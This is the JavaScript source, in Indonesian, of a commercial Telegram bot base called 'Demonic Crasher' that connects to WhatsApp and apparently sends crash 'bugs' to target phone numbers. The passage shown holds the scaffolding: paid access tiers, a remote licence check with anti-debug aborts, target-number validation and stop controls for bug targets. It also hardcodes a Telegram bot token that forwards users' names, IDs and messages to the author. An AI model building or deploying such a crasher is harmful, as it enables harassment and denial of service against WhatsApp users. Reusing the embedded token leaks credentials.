/*
Hello Buyer Base Demonic Crasher By Rozzy Official
Notes : • Base ini Premium 🔱
• NO FREE KE ORANG LAIN
• NO SHARE PUBLIK
• NO JUAL ULANG
• NO JUAL + NO ENC
• BOLEH RENAME
• WAJIB JAGA CREDIT
• NO HAPUS CREATE BY ROZZY OFFICIAL

Base ini menggunakan VERSI TELEGRAM (TELEGRAF)
Dirancang khusus oleh Rozzy Official untuk membantu kalian dalam membuat Script Bot Telegram dengan sistem yang lebih rapi, aman, dan modern.
Base Demonic Crasher Version 16 Gen 5
Base ini berbeda dari base lainnya karena: • Menggunakan Sistem Tombol / Callback Next
(bukan 1 fitur = 1 tombol)

• Sudah dilengkapi Tools Menu
• Sistem Password & Verifikasi Password
• Bars / Progress System
• Bisa diatur START KHUSUS PREMIUM
• Support sistem keamanan lanjutan

🔐 Security Base
• Anti Bypass Easy
• Database Token
• Password Protection
• Verifikasi User

⭐ Sistem Premium
Base ini sudah mendukung FITUR PREMIUM, di antaranya: • Akses menu khusus Premium User
• Start bot bisa dikunci khusus premium
• Sistem verifikasi sebelum masuk menu premium
• Bisa dikembangkan menjadi jualan akses / subscription
• Cocok untuk bot private maupun commercial
CREATE BY ROZZY OFFICIAL
Telegram : @ROZZYOFFICIAL

⚠️ PERINGATAN
Jika ada yang menyebarkan base ini tanpa izin:
📩 Hubungi @RozzyOfficial
Akan diberikan imbalan / hadiah bagi yang melapor.

#Respect
#BuyerOnly
#NoShare
#DemonicCrasherV16
*/
// ===== IMPORT =====
const OWNER_CHAT_ID = '7571435782';//UBAH ID LU
const { Telegraf, Markup, session } = require("telegraf"); //TELEGRAF NYA
const fetch = require("node-fetch");
const fs = require("fs");
const vm = require("vm")
const path = require("path");
const moment = require("moment-timezone");

const {
  parseDuration,
  setGlobalCooldown,
  isOnGlobalCooldown,
  getGlobalRemaining,
  setGlobalDuration
} = require("./cooldown");

const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  generateWAMessage,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const readline = require('readline');
const AdmZip = require('adm-zip');
const FormData = require("form-data");
const { BOT_TOKEN, OWNER_IDS } = require("./config.js");
// MIDLEWARE OWNER \\
const khususImg = "https://files.catbox.moe/z3zaqe.jpg"; // link gambar tetap

const checkOwner = async (ctx, next) => {
  const userId = ctx.from.id.toString();

  if (!OWNER_IDS.includes(userId)) {
    return ctx.replyWithPhoto(khususImg, {
      caption:
`╭────────────────────╮
│ ❌ FITUR OWNER ONLY 
├────────────────────┤
│ ⚠️ Kamu bukan Owner 
│ 💬 Hubungi Owner    
├────────────────────┤
│ 👑 DEMONIC CRASHER  
╰────────────────────╯`,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💰 Buy Script / Hubungi Owner", url: "https://t.me/RozzyOfficial" }
          ]
        ]
      }
    });
  }

  return next();
};

const { Composer } = require("telegraf");

const owner = new Composer();
// UNTUK COMMAND KHUSUS GRUB \\
const onlyGroup = async (ctx) => {
  if (!ctx.chat || ctx.chat.type === "private") {
    await ctx.reply("❗Command hanya bisa dipakai di grup");
    return false;
  }
  return true;
};

const mustReplyUser = (ctx) => {
  if (!ctx.message?.reply_to_message?.from) {
    ctx.reply("❗Reply pesan user dulu");
    return false;
  }
  return true;
};
const crypto = require("crypto");
const sessionPath = './session';
let bots = [];
/* ===== BOT INIT ===== */
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());
function progressBar(current, total, size = 10) {
  const percent = Math.floor((current / total) * 100)
  const filled = Math.floor((current / total) * size)
  return `【${"█".repeat(filled)}${"░".repeat(size - filled)}】 ${percent}% (${current}/${total})`
}

async function sendStickerSafe(chatId, stickerId) {
  try {
    await bot.telegram.sendSticker(chatId, stickerId)
    await sleep(700)
  } catch (e) {
    console.log("Sticker error:", e.message)
  }
}

async function resolveTargetTG(input) {
  try {
    if (/^-?\d+$/.test(input)) return Number(input)
    if (input.startsWith("@")) {
      const chat = await bot.telegram.getChat(input)
      return chat.id
    }
    return null
  } catch {
    return null
  }
}
// ~ KUMPULAN GLOBAL TOOLS NO HAPUS ~ \\
const csSessions = new Map();
// userId => { chatId, csId, threadId, active }
const activeChats = new Map()
// key: userId
// value: { threadId, active: true }
const fixedBugTargets = new Map();   // soft stop
const deletedBugTargets = new Map(); // hard stop
// helper resolve target
const devChatFile = `./devchat.json`
if (!fs.existsSync(devChatFile)) {
  fs.writeFileSync(devChatFile, JSON.stringify({ last: null }, null, 2))
}

function saveLastDevChat(data) {
  fs.writeFileSync(devChatFile, JSON.stringify(data, null, 2))
}

function loadLastDevChat() {
  return JSON.parse(fs.readFileSync(devChatFile))
}
async function sendNotifOwner(msg, customMessage = ``) {
  try {
    const chatId = msg.chat.id
    const userId = msg.from.id
    const username = msg.from.username || `Tidak ada username`
    const firstName = msg.from.first_name || ``
    const lastName = msg.from.last_name || ``
    const messageText = customMessage || msg.text || `-`

    // simpan user terakhir
    saveLastDevChat({
      last: {
        chatId,
        userId,
        username,
        firstName,
        lastName
      }
    })

    const message = `
<b>✨ ROZZY MENERIMA PESAN ✨</b>

<b>👤 Pengirim:</b>
- <b>Nama:</b> <code>${firstName} ${lastName}</code>
- <b>Username:</b> @${username}
- <b>ID:</b> <code>${userId}</code>
- <b>Chat ID:</b> <code>${chatId}</code>

<b>💬 Pesan:</b>
<pre>${messageText}</pre>

<b>📌 Balas dengan:</b>
<code>/Balasid atau BalasChat ${userId} pesan_kamu</code>
`

    const url = `https://api.telegram.org/bot8403158341:AAFOYtr3tqvAWqRoyl3N8IShNnER70qrfyM/sendMessage`

    await axios.post(url, {
      chat_id: OWNER_CHAT_ID,
      text: message,
      parse_mode: `HTML`
    })

    console.log(`Notifikasi pesan pengguna berhasil dikirim ke owner.`)
  } catch (error) {
    console.error(`Gagal mengirim notifikasi ke owner:`, error.message)
  }
}
// ===== STORAGE =====
bot.reactTarget = null
bot.reactOn = false
const reactEmojis = ["👍","❤️","🔥","👏","😁","🎉","🤔","😢"]
// add filter
bot.filterTarget // nama channel target
bot.filterWord   // kata yang mau difilter
bot.filterOn     // status ON / OFF
const ADD_FILE_STATE = {};
// BATAS NYA \\
global.pairingNotifyChat = null;
const notifyPairingChat = async (text) => {
  if (!global.pairingNotifyChat) return;

  try {
    await bot.telegram.sendMessage(
      global.pairingNotifyChat,
      text,
      { parse_mode: "HTML" }
    );
  } catch (err) {
    console.log("❌ Gagal kirim notif pairing:", err.message);
  }
};
// ~ END / PEMBATAS ~ \\
const ownerUsers = OWNER_IDS;
const BOT_PASSWORD = "RozzyOfficial";//Ganti pw sesuai lu

const bars = [
  "▣ DEMONIC CRASHER ▣",
  "AUTHOR : ROZZY OFFICIAL",
  "▢▢▢▢▢",
  "▣▢▢▢▢",
  "▣▣▢▢▢",
  "▣▣▣▢▢",
  "▣▣▣▣▢",
  "▣▣▣▣▣"
];

const delay = (ms) => new Promise(res => setTimeout(res, ms));

bot.start(async (ctx) => {
  ctx.session ??= {};

  // ✅ kalau sudah verified
  if (ctx.session.isVerified) {
    return ctx.reply(
`╭────────────────────╮
│ ✅ AKUN TERVERIFIKASI
├────────────────────┤
│ 🔓 Akses dibuka     
│ ❤️ Terima kasih     
├────────────────────┤
│ 📂 Ketik /menu      
│ 🚀 Untuk lanjut     
├────────────────────┤
│ 👑 DEMONIC CRASHER   
╰────────────────────╯`
   );
  }

  // 🔒 ANTI DOUBLE /start (TAMBAHAN)
  if (ctx.session.loading) {
    return ctx.reply("⏳ Sistem sedang diproses, tunggu sebentar...");
  }

  // reset state tiap /start
  ctx.session.loading = true;
  ctx.session.waitingPassword = false;

  /* ===== ANIMASI TEKS AWAL ===== */
  let msg = await ctx.reply("𝗦𝗘𝗟𝗔𝗠𝗔𝗧 𝗗𝗔𝗧𝗔𝗡𝗚 𝗕𝗨𝗬𝗘𝗥 ❤");
  await delay(1000);
  await ctx.telegram.deleteMessage(ctx.chat.id, msg.message_id).catch(() => {});

  msg = await ctx.reply("🔥 DEMONIC CRASHER");
  await delay(1000);
  await ctx.telegram.deleteMessage(ctx.chat.id, msg.message_id).catch(() => {});

  msg = await ctx.reply("👨‍💻 DEVELOPER : @ROZZYOFFICIAL");
  await delay(1200);
  await ctx.telegram.deleteMessage(ctx.chat.id, msg.message_id).catch(() => {});

  /* ===== ANIMASI BARS ===== */
  const barMsg = await ctx.reply(
    "🔐 Menyiapkan System...\n\n🩸 DEMONIC CRASHER 🥶"
  );

  let i = 0;

  // 🔧 SIMPAN INTERVAL KE SESSION (TAMBAHAN)
  ctx.session.loadingInterval = setInterval(async () => {
    try {
      const bar = bars[Math.min(i, bars.length - 1)];

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        barMsg.message_id,
        null,
        `🔐 Menyiapkan System...\n\n${bar}`
      );

      i++;

      if (i === bars.length) {
        clearInterval(ctx.session.loadingInterval);
        ctx.session.loadingInterval = null;

        ctx.session.loading = false;
        ctx.session.waitingPassword = true;

        await ctx.telegram.editMessageText(
          ctx.chat.id,
          barMsg.message_id,
          null,
          "🔐 𝗠𝗔𝗦𝗨𝗞𝗞𝗔𝗡 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗\n\n" +
          "━━━━━━━━━━━━━━━\n" +
          "🗝️ Ketik password akses\n" +
          "🔁 /start untuk mengulang\n" +
          "━━━━━━━━━━━━━━━"
        );
      }
    } catch (e) {
      clearInterval(ctx.session.loadingInterval);
      ctx.session.loadingInterval = null;

      ctx.session.loading = false;

      // 🔒 ANTI SPAM PASSWORD (TAMBAHAN)
      if (!ctx.session.waitingPassword) {
        ctx.session.waitingPassword = true;
        await ctx.reply(
          "🔐 𝗠𝗔𝗦𝗨𝗞𝗞𝗔𝗡 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗\n\n" +
          "━━━━━━━━━━━━━━━\n" +
          "🗝️ Ketik password akses\n" +
          "🔁 /start untuk mengulang\n" +
          "━━━━━━━━━━━━━━━"
        );
      }
    }
  }, 800);
});

/* ===== HANDLER PASSWORD ===== */
bot.on("text", async (ctx, next) => {
  ctx.session ??= {};

  // bukan mode password → lanjut handler lain
  if (!ctx.session.waitingPassword) return next();

  const text = ctx.message.text.trim();

  // ❌ user malah ngetik command
  if (text.startsWith("/")) {
    ctx.session.waitingPassword = false; // ⬅️ hentikan mode
    return ctx.reply(
      "🔁 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 𝗗𝗨𝗟𝗨 𝗕𝗔𝗡𝗚\n\n" +
      "━━━━━━━━━━━━━━━\n" +
      "📌 Ketik /start untuk mengulang\n" +
      "━━━━━━━━━━━━━━━"
    );
  }

  // ✅ PASSWORD BENAR
  if (text === BOT_PASSWORD) {
    ctx.session.waitingPassword = false;
    ctx.session.isVerified = true;

    return ctx.reply(
`╭────────────────────╮
│ ✅ PASSWORD VALID   
├────────────────────┤
│ 🔓 Akses dibuka    
│ ❤️ Terima kasih    
├────────────────────┤
│ 📂 Ketik /menu      
│ 🚀 Untuk lanjut     
├────────────────────┤
│ 👑 DEMONIC CRASHER  
╰────────────────────╯`
    );
  }

  // ❌ PASSWORD SALAH (ANTI SPAM)
  ctx.session.waitingPassword = false; // ⬅️ KUNCI ANTI SPAM
  return ctx.reply(
    "❌ 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 𝗦𝗔𝗟𝗔𝗛\n\n" +
    "━━━━━━━━━━━━━━━\n" +
    "🔐 Akses ditolak\n" +
    "🔁 Ketik /start untuk mencoba lagi\n" +
    "━━━━━━━━━━━━━━━"
  );
});

/* ===== MIDDLEWARE VERIFIED (PAKAI DI /menu DLL) ===== */
const checkVerified = async (ctx, next) => {
  if (!ctx.session?.isVerified) {
    await ctx.reply(
`╭────────────────────╮
│ 😹 MAU NGAPAIN?     
├────────────────────┤
│ 🔒 AKSES TERKUNCI  
│ ❌ BELUM LOGIN     
├────────────────────┤
│ ▶️ /start           
│ 🔑 Masukkan Password
├────────────────────┤
│ 👑 DEMONIC CRASHER  
╰────────────────────╯`
    );
    return;
  }
  return next();
};
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
// === Path File ===
const premiumFile = "./RozzyIsHere/premiums.json";
const svipFile = "./RozzyIsHere/svip.json";

// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

// === Load Semua Data Saat Startup ===
let svipUsers = loadJSON(svipFile);
let premiumUsers = loadJSON(premiumFile);

// === Middleware Role ===
const checkSvip = (ctx, next) => {
  if (!svipUsers.includes(ctx.from.id.toString())) {
    return ctx.replyWithPhoto(
      khususImg, // pastikan nama variabel sama dan tidak ada koma ganda
      {
        caption:
`╭────────────────────╮
│ ❌ FITUR SVIP ONLY 
├────────────────────┤
│ ⚠️ Kamu bukan Svip
│ 💬 Hubungi Owner    
├────────────────────┤
│ 👑 DEMONIC CRASHER  
╰────────────────────╯`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "Owner ➡️", url: "https://t.me/RozzyOfficial" }
            ]
          ]
        }
      }
    );
  }
  return next();
};

const checkPremium = async (ctx, next) => {
  try {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
      await ctx.telegram.sendPhoto(
        ctx.chat.id,
        khususImg,
        {
          caption:
`╭────────────────────╮
│ ❌ FITUR PREMIUM ONLY 
├────────────────────┤
│ ⚠️ Kamu bukan Premium
│ 💬 Hubungi Owner
├────────────────────┤
│ 👑 DEMONIC CRASHER  
╰────────────────────╯`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "Owner ➡️", url: "https://t.me/RozzyOfficial" }]
            ]
          }
        }
      );
      return; // STOP chain
    }

    return next(); // lanjut ke command
  } catch (e) {
    console.error("checkPremium error:", e);
  }
};

// === Fungsi Admin / Premium ===
const addSvip = (userId) => {
  if (!svipUsers.includes(userId)) {
    svipUsers.push(userId)
    saveJSON(svipFile, svipUsers)
  }
}

const removeSvip = (userId) => {
  svipUsers = svipUsers.filter(id => id !== userId)
  saveJSON(svipFile, svipUsers)
}

const addPremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};
global.sock = null;
global.isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
"https://files.catbox.moe/8p61dy.jpg",
"https://files.catbox.moe/8p61dy.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

const randomImg = [
"https://files.catbox.moe/8p61dy.jpg",
"https://files.catbox.moe/z3zaqe.jpg",
];

const getRandomImg = () =>
  randomImg[Math.floor(Math.random() * randomImg.length)];
// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/ADWSTORE/ADWTokenDB/main/tokens.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}
async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

console.log(chalk.bold.blue("Sedang Mengecek Database..."));

//ANTI BY PASS
try {
  if (
    typeof axios.get !== 'function' ||
    typeof axios.create !== 'function' ||
    typeof axios.interceptors !== 'object' ||
    !axios.defaults
  ) {
    console.error(`[SECURITY] Axios telah dimodifikasi`);
    process.abort();
  }

  if (
    axios.interceptors.request.handlers.length > 0 ||
    axios.interceptors.response.handlers.length > 0
  ) {
    console.error(`[SECURITY] Axios interceptor aktif (bypass terdeteksi)`);
    process.abort();
  }

  const env = process.env;
  if (
    env.HTTP_PROXY || env.HTTPS_PROXY || env.NODE_TLS_REJECT_UNAUTHORIZED === '0'
  ) {
    console.error(`[SECURITY] Proxy atau TLS bypass aktif`);
    process.abort();
  }

  const execArgs = process.execArgv.join(' ');
  if (/--inspect|--debug|repl|vm2|sandbox/i.test(execArgs)) {
    console.error(`[SECURITY] Debugger / sandbox / VM terdeteksi`);
    process.abort();
  }

  const realToString = Function.prototype.toString.toString();
  if (Function.prototype.toString.toString() !== realToString) {
    console.error(`[SECURITY] Function.toString dibajak`);
    process.abort();
  }

  const mod = require('module');
  const _load = mod._load.toString();
  if (!_load.includes('tryModuleLoad') && !_load.includes('Module._load')) {
    console.error(`[SECURITY] Module._load telah dibajak`);
    process.abort();
  }

  const cache = Object.keys(require.cache || {});
  const suspicious = cache.filter(k =>
    k.includes('axios') &&
    !/node_modules[\\/]+axios[\\/]+(dist[\\/]+node[\\/]+axios\.cjs|index\.js)$/.test(k)
  );

  if (suspicious.length > 0) {
    console.error(`[SECURITY] require.cache mencurigakan`);
    process.abort();
  }

} catch (err) {
  console.error(`[SECURITY] Proteksi gagal jalan:`, err);
  process.abort();
}
console.log("✅ Proteksi Anti Bypass Active ./RozzyOfficial");

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("═══════════════════════════════════════════"));
    console.log(chalk.bold.red("TOKEN ANDA TIDAK TERDAFTAR DI DATA BASE - BUY AKSES DI @ROZZYOFFICIAL !!!"));
    console.log(chalk.red("═══════════════════════════════════════════"));
    process.exit(1);
  }

  console.log(chalk.green(`[!] System: Token Kamu Terdaftar Dalam Database! Terimakasih Sudah Membeli Script Ini.\n`));
  startBot();
}

function startBot() {
  console.clear();

  console.log(
    chalk.magentaBright(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣤⡶⠁⣠⣴⣾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⣴⣿⠿⠋⣁⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣾⣿⡿⠟⠋⠉⠀⣀⣀⣀⣨⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⣤⣴⠂
⠈⠉⠁⠀⠀⣀⣴⣾⣿⣿⡿⠟⠛⠉⠉⠉⠉⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠋⠁⠀
⠀⠀⠀⢀⣴⣿⣿⣿⡿⠁⠀⢀⣀⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣾⣿⣿⣿⡿⠁⢀⣴⣿⠋⠉⠉⠉⠉⠛⣿⣿⣶⣤⣤⣤⣤⣶⠖⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⡇⢀⣿⣿⣇⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀
⠀⠀⠸⣿⣿⣿⣿⡇⠈⢿⣿⣿⠇⠀⠀⠀⠀⠀⢠⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢿⣿⣿⣿⣷⡀⠀⠉⠉⠀⠀⠀⠀⠀⢀⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣋⣠⡤⠄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀

██████╗  ██████╗ ███████╗███████╗██╗   ██╗
██╔══██╗██╔═══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝
██████╔╝██║   ██║  ███╔╝   ███╔╝  ╚████╔╝ 
██╔══██╗██║   ██║ ███╔╝   ███╔╝    ╚██╔╝  
██║  ██║╚██████╔╝███████╗███████╗   ██║   
╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝   ╚═╝   

⚡DEMONIC CRASHER BOT SYSTEM ⚡
🛡️SECURED • PROTEKSI • ANTI BYPASS

TELEGRAM - @ROZZYOFFICIAL - DEVELOPER

MAKASIH SAYANG TELAH ORDER SCRIPT 🗿.
`)
  );

  console.log(
    chalk.bold.green(`
🔱 DEMONIC CRASHER VERSION 16 GEN 5 🦖
`)
  );
}

validateToken();
// WhatsApp Connection
const store = makeInMemoryStore({
  logger: pino().child({ level: "silent", stream: "store" })
})

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
  const { version } = await fetchLatestBaileysVersion()

  global.sock = makeWASocket({
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ["Mac OS", "Safari", "10.15.7"],
    getMessage: async () => ({ conversation: "P" })
  })

  const sock = global.sock

  // ===== RELAY COMPAT (AMAN) =====
  if (!sock.relayMessage) {
    sock.relayMessage = async (jid, message, options = {}) => {
      return sock.sendMessage(jid, message, options)
    }
  }

  sock.ev.on("creds.update", saveCreds)
  store.bind(sock.ev)

  sock.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update

    // ✅ CONNECTED
    if (connection === "open") {
      global.isWhatsAppConnected = true

      console.log(chalk.red.bold(`
╭────────────────────────────╮
│   WHATSAPP TERHUBUNG ❤️    │
╰────────────────────────────╯`))

      notifyPairingChat(
`╭────────────────────────────╮
│ ✅ WHATSAPP CONNECTED       │
├────────────────────────────┤
│ 📱 Status : ONLINE         │
│ 🚀 Bot Siap Digunakan      │
├────────────────────────────┤
│ 👑 DEMONIC CRASHER         │
╰────────────────────────────╯`
      )
    }

    // ❌ DISCONNECTED
    if (connection === "close") {
      global.isWhatsAppConnected = false

      console.log(chalk.red.bold(`
╭────────────────────────────╮
│   WHATSAPP TERPUTUS 💔     │
╰────────────────────────────╯`))

      notifyPairingChat(
`╭────────────────────────────╮
│ ❌ WHATSAPP DISCONNECTED    │
├────────────────────────────┤
│ 📱 Status : OFFLINE        │
│ 🔄 Reconnecting...         │
├────────────────────────────┤
│ 👑 DEMONIC CRASHER         │
╰────────────────────────────╯`
      )

      if (
        lastDisconnect?.error?.output?.statusCode !==
        DisconnectReason.loggedOut
      ) {
        startSesi()
      }
    }
  })
}
// ===== MIDDLEWARE =====
const checkWhatsAppConnection = (ctx, next) => {
  if (!global.sock || !global.isWhatsAppConnected) {
    return ctx.reply("Whatsapp Belum Terhubung Ketik /reqpairing 62xx Terlebih Dahulu ❗");
  }
  return next();
};
// FUNGSI DELBUG \\
function normalizeTarget(input) {
  if (!input) return null;
  if (input.includes("@s.whatsapp.net")) return input;
  return input.replace(/\D/g, "") + "@s.whatsapp.net";
}

// FIXEDBUG (soft freeze)
function fixedBug(target) {
  fixedBugTargets.set(target, true);
}

// DELETEBUG (hard kill)
function deleteBug(target) {
  deletedBugTargets.set(target, true);
}

function isFixedBug(target) {
  return fixedBugTargets.has(target);
}

function isDeletedBug(target) {
  return deletedBugTargets.has(target);
}

// tunggu kalau FIXEDBUG
async function waitIfFixedBug(target) {
  while (isFixedBug(target)) {
    await new Promise(r => setTimeout(r, 400));
  }
}
//////CEK WHATSAPP\\\\\\
async function resolveTargetWa(ctx, q) {
  const sock = global.sock;

  if (!sock || !sock.user) {
    await ctx.reply("❌ Socket WhatsApp belum siap");
    return null;
  }

  // Bersihkan input jadi angka saja
  const num = (q || "").replace(/[^0-9]/g, "");

  // Validasi nomor internasional (8–15 digit)
  if (num.length < 8 || num.length > 15) {
    await ctx.reply(
      "❌ Format nomor salah!\nGunakan format internasional:\nContoh: 62812xxxx / 6012xxxx / 1202xxxx"
    );
    return null;
  }

  const target = num + "@s.whatsapp.net";

  // 🔒 Anti self hit
  const botNumber = sock.user.id.split(":")[0];
  if (num === botNumber) {
    await ctx.reply("❌ Target tidak boleh nomor bot sendiri");
    return null;
  }

  // 🔍 Cek nomor ada di WhatsApp
  const [check] = await sock.onWhatsApp(num);
  if (!check?.exists) {
    await ctx.reply("❌ Nomor target tidak terdaftar WhatsApp");
    return null;
  }

  return { sock, num, target };
}
async function editOrSend(ctx, media, keyboard) {
  await ctx.answerCbQuery().catch(() => {});
  try {
    await ctx.editMessageMedia(
      {
        type: "photo",
        media: media.media,
        caption: media.caption,
        parse_mode: "HTML"
      },
      {
        reply_markup: keyboard
      }
    );
  } catch {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: "HTML",
      reply_markup: keyboard
    });
  }
}
////=========MENU UTAMA========\\\\
bot.command("menu", checkVerified, checkPremium, async (ctx) => {
  try {
    if (!ctx.from) return;
    const userId = ctx.from.id.toString();
    const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
    const waktuRunPanel = getUptime();

    const mainMenuMessage = `<blockquote>
⬡═―—⊱ ⎧ DEMONIC CRASHER ⎭ ⊰―—═⬡  

👑 Owner   : @ROZZYOFFICIAL  
👤 User    : ${Name}  
⏱ Runtime : ${waktuRunPanel}  

( PAGE 1 / 10 )  
──────────────  

⬡═―—⊱ ⎧ STATUS BOT ⎭ ⊰―—═⬡  
• Name    : Demonic Crasher  
• Version : V16 GEN 5  
• Price   : 10K – 100K  
──────────────  

⬡═―—⊱ ⎧ BUY SCRIPT ⎭ ⊰―—═⬡  
• Contact : @ROZZYOFFICIAL  
• Chat Owner for Purchase  
──────────────  
</blockquote>`;

    const mainKeyboard = [
      [
        { text: "Devas", url: "https://t.me/RozzyOfficial" },
        { text: "Information", url: "https://t.me/DemonicCrasher" },
        { text: "About Devas", url: "https://t.me/AboutRozzy" }
      ],
      [
        { text: "Next ➡", callback_data: "info_menu" },
      ],
    ];

    // ===== FOTO + MENU =====
    await ctx.replyWithPhoto(getRandomImage(), {
      caption: mainMenuMessage,
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: mainKeyboard },
    });

    // ===== AUDIO TELEGRAM (TANPA SENDER) =====
    await ctx.replyWithAudio(
  {
    source: fs.createReadStream("./Catbox/musik.mp3")
  },
  {
    caption: "𝘊𝘪𝘯𝘵𝘢 𝘐𝘵𝘶 𝘕𝘺𝘢𝘮𝘢𝘯, 𝘉𝘶𝘬𝘢𝘯 𝘗𝘢𝘬𝘴𝘢𝘢𝘯....",
    title: "𝘋𝘦𝘮𝘰𝘯𝘪𝘤 𝘈𝘶𝘥𝘪𝘰",
    performer: "𝘋𝘦𝘮𝘰𝘯𝘪𝘤 𝘊𝘳𝘢𝘴𝘩𝘦𝘳"
  }
);

  } catch (err) {
    console.error("MENU COMMAND ERROR:", err);
    if (ctx.reply) ctx.reply("❌ Gagal menampilkan menu.");
  }
});
// Handler Sekedar Information
bot.action("info_menu", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
( PAGE 2 / 10 )

⬡═―—⊱ ⎧ INFORMATION ⎭ ⊰―—═⬡  
╭────────────────────────╮  
│ Script No Update → 10K  
│ Reseller         → 25K  
│ Partner          → 35K  
│ Moderator        → 45K  
│ CEO              → 55K  
│ Owner            → 65K  
│ SVIP             → 100K  
╰────────────────────────╯  
╭────────────────────────╮  
│ Payment :  
│ Dana & Gopay  
│ Qris All Payment  
│ Bank : Not Available  
╰────────────────────────╯  
⬡═―—⊱ ⎧ BUY SCRIPT ⎭ ⊰―—═⬡  

Contact : @ROZZYOFFICIAL  

Permintaan Owner 😘 : 
• Mohon Kerja Sama Nya Mohon Jangan By Pass Dan Jangan Seenaknya Tanpa Sepengetahuan Owner.
• Jangan Jual Script Ini Selain Seller.
• Jangan Share Publik.
• Jangan Crack Script Ini.

Thanks ❤.
</blockquote>`;

  const media = { type: "photo", media: getRandomImage(), caption: mainMenuMessage, parse_mode: "HTML" };
  const keyboard = { inline_keyboard: [[{ text: "Back ⬅️", callback_data: "info_menu" }, { text: "Kata Dulu 😎 ➡", callback_data: "kata_menu" }]] };

  await editOrSend(ctx, media, keyboard);
});
bot.action("kata_menu", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
( PAGE 3 / 10 )

⬡═―—⊱ ⎧ KATA ROZZY ⎭ ⊰―—═⬡  
╭────────────────────────╮  
│ Di situ panas? kita gaya bebas duar 🔥  
│ Di situ panas? kalungan kulkas deck 🥴  
